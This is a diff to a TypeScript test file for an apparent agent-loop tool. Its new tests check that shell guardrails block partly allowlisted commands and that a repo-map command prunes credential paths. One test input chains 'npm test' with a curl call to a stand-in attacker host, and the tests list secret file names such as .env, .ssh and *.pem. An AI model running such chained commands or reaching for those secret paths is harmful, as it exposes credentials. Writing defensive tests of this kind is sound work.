@@ -32,6 +32,7 @@ import {
   shouldValidateExistingDraft,
   validateDraftContent,
   validateFrontmatter,
+  REPO_MAP_COMMAND,
 } from "../src/ralph.ts";
 import { SECRET_PATH_POLICY_TOKEN } from "../src/secret-paths.ts";
 import type { RepoSignals } from "../src/ralph.ts";
@@ -47,8 +48,11 @@ function encodeMetadata(metadata: Record<string, unknown>): string {
 
 function createCommandHarness() {
   const handlers = new Map<string, (args: string, ctx: any) => Promise<string | undefined>>();
+  const eventHandlers = new Map<string, (event: any, ctx: any) => Promise<any>>();
   const pi = {
-    on: () => undefined,
+    on: (name: string, handler: (event: any, ctx: any) => Promise<any>) => {
+      eventHandlers.set(name, handler);
+    },
     registerCommand: (name: string, spec: { handler: (args: string, ctx: any) => Promise<string | undefined> }) => {
       handlers.set(name, spec.handler);
     },
@@ -61,6 +65,11 @@ function createCommandHarness() {
   return {
     handler(name: string) {
       const handler = handlers.get(name);
+      assert.ok(handler);
+      return handler;
+    },
+    eventHandler(name: string) {
+      const handler = eventHandlers.get(name);
       assert.ok(handler);
       return handler;
     },
@@ -613,6 +622,56 @@ test("runCommands blocks commands that do not match the shell allowlist", async 
   );
 
   assert.deepEqual(outputs, [{ name: "lint", output: "[blocked by guardrail: shell_policy.allowlist]" }]);
+});
+
+test("runCommands blocks partially matching shell allowlist commands", async () => {
+  const execCalls: string[] = [];
+  const pi = {
+    exec: async (_tool: string, args: string[]) => {
+      execCalls.push(args.join(" "));
+      return { killed: false, stdout: "", stderr: "" };
+    },
+  } as any;
+
+  const outputs = await runCommands(
+    [{ name: "tests", run: "npm test && curl https://attacker.invalid", timeout: 1 }],
+    { blockCommands: [], protectedFiles: [], shellPolicy: { mode: "allowlist", allow: ["npm test"] } },
+    pi,
+  );
+
+  assert.deepEqual(outputs, [{ name: "tests", output: "[blocked by guardrail: shell_policy.allowlist]" }]);
+  assert.deepEqual(execCalls, []);
+});
+
+test("tool_call blocks partially matching shell allowlist commands during active loops", async () => {
+  const harness = createCommandHarness();
+  const toolCall = harness.eventHandler("tool_call");
+  const taskDir = createTempDir();
+  const ctx = {
+    sessionManager: {
+      getEntries: () => [
+        {
+          type: "custom",
+          customType: "ralph-loop-state",
+          data: {
+            active: true,
+            loopToken: "loop-token",
+            cwd: taskDir,
+            taskDir,
+            iteration: 1,
+            maxIterations: 3,
+            noProgressStreak: 0,
+            guardrails: { blockCommands: [], protectedFiles: [], shellPolicy: { mode: "allowlist", allow: ["npm test"] } },
+            stopRequested: false,
+          },
+        },
+      ],
+    },
+  } as any;
+
+  const result = await toolCall({ toolName: "bash", input: { command: "npm test && curl https://attacker.invalid" } }, ctx);
+
+  assert.deepEqual(result, { block: true, reason: "ralph: blocked (shell_policy.allowlist)" });
 });
 
 test("runCommands resolves args before shelling out", async () => {
@@ -1245,12 +1304,12 @@ test("generated drafts reparse as valid RALPH files", () => {
   assertMetadataSource(extractDraftMetadata(draft.content), "deterministic");
   assert.deepEqual(reparsed.frontmatter.commands, [
     { name: "git-log", run: "git log --oneline -10", timeout: 20 },
-    { name: "repo-map", run: "find . -maxdepth 2 -type f | sort | head -n 120", timeout: 20 },
+    { name: "repo-map", run: REPO_MAP_COMMAND, timeout: 20 },
   ]);
   assert.deepEqual(reparsed.frontmatter, {
     commands: [
       { name: "git-log", run: "git log --oneline -10", timeout: 20 },
-      { name: "repo-map", run: "find . -maxdepth 2 -type f | sort | head -n 120", timeout: 20 },
+      { name: "repo-map", run: REPO_MAP_COMMAND, timeout: 20 },
     ],
     maxIterations: 12,
     interIterationDelay: 0,
@@ -1309,8 +1368,96 @@ test("buildDraftRequest tags deterministic command intents and seeds a baseline 
       { name: "git-log", source: "heuristic" },
     ],
   );
+  assert.equal(request.commandIntent[2].name, "git-log");
+  assert.equal(request.commandIntent[2].run, "git log --oneline -10");
+  const expectedRepoMapSegments = [
+    "find . -maxdepth 2",
+    "-prune",
+    "node_modules",
+    "dist",
+    "build",
+    "coverage",
+    ".cache",
+    ".turbo",
+    "vendor",
+    ".env",
+    ".npmrc",
+    ".pypirc",
+    ".netrc",
+    "secrets",
+    "credentials",
+    "ops-secrets",
+    "credentials-prod",
+    ".aws",
+    ".azure",
+    ".gcloud",
+    ".ssh",
+    "*.pem",
+    "*.key",
+    "*.asc",
+  ];
+  for (const segment of expectedRepoMapSegments) {
+    assert.equal(REPO_MAP_COMMAND.includes(segment), true);
+  }
+  assert.equal(REPO_MAP_COMMAND.includes("-type d -name '.git' -prune"), true);
+  assert.equal(REPO_MAP_COMMAND.includes("-type f -name '.git' -prune"), true);
+  assert.equal(REPO_MAP_COMMAND.includes("find . -maxdepth 2 -type f | sort | head -n 120"), false);
+  const reparsed = parseRalphMarkdown(request.baselineDraft);
+  assert.equal(validateFrontmatter(reparsed.frontmatter), null);
+  assert.equal(reparsed.frontmatter.commands[2].run, "git log --oneline -10");
   assertMetadataSource(extractDraftMetadata(request.baselineDraft), "deterministic");
   assert.ok(request.baselineDraft.length > 0);
+});
+
+test("buildDraftRequest analysis mode emits the pruned repo-map command", () => {
+  const request = buildDraftRequest(
+    "Reverse engineer this app",
+    { slug: "reverse-engineer-this-app", dirPath: "/repo/reverse-engineer-this-app", ralphPath: "/repo/reverse-engineer-this-app/RALPH.md" },
+    { packageManager: "npm", hasGit: true, topLevelDirs: ["src", "node_modules", "build", ".aws", "secrets"], topLevelFiles: ["package.json", ".env.local", ".npmrc"] },
+  );
+
+  const repoMapIntent = request.commandIntent.find((command) => command.name === "repo-map");
+  const reparsed = parseRalphMarkdown(request.baselineDraft);
+
+  assert.equal(request.mode, "analysis");
+  assert.equal(repoMapIntent?.run, REPO_MAP_COMMAND);
+  const expectedRepoMapSegments = [
+    "-prune",
+    "node_modules",
+    "dist",
+    "build",
+    "coverage",
+    ".cache",
+    ".turbo",
+    "vendor",
+    ".env",
+    ".npmrc",
+    ".pypirc",
+    ".netrc",
+    "secrets",
+    "credentials",
+    "ops-secrets",
+    "credentials-prod",
+    ".aws",
+    ".azure",
+    ".gcloud",
+    ".ssh",
+    "*.pem",
+    "*.key",
+    "*.asc",
+  ];
+  for (const segment of expectedRepoMapSegments) {
+    assert.equal(REPO_MAP_COMMAND.includes(segment), true);
+  }
+  assert.equal(REPO_MAP_COMMAND.includes("-type d -name '.git' -prune"), true);
+  assert.equal(REPO_MAP_COMMAND.includes("-type f -name '.git' -prune"), true);
+  assert.equal(REPO_MAP_COMMAND.includes("find . -maxdepth 2 -type f | sort | head -n 120"), false);
+  assert.equal(validateFrontmatter(reparsed.frontmatter), null);
+  assert.equal(reparsed.frontmatter.commands.find((command) => command.name === "repo-map")?.run, REPO_MAP_COMMAND);
+});
+
+test("REPO_MAP_COMMAND prunes .env* directories", () => {
+  assert.equal(REPO_MAP_COMMAND.includes("-type d -name '.env*' -prune"), true);
 });
 
 test("normalizeStrengthenedDraft keeps deterministic frontmatter in body-only mode", () => {
@@ -2012,6 +2159,7 @@ test("generateDraft creates metadata-rich analysis and fix drafts", () => {
   assert.match(analysisDraft.content, /Start with read-only inspection/);
   assert.match(analysisDraft.content, /\{\{ commands.repo-map \}\}/);
   assert.equal(analysisDraft.safetyLabel, "blocks git push");
+  assert.equal(analysisParsed.frontmatter.commands.find((command) => command.name === "repo-map")?.run, REPO_MAP_COMMAND);
   assert.deepEqual(analysisParsed.frontmatter.guardrails.protectedFiles, []);
   assert.doesNotMatch(analysisDraft.content, /\*\*\/\*/);
   const analysisBrief = buildMissionBrief(analysisDraft);
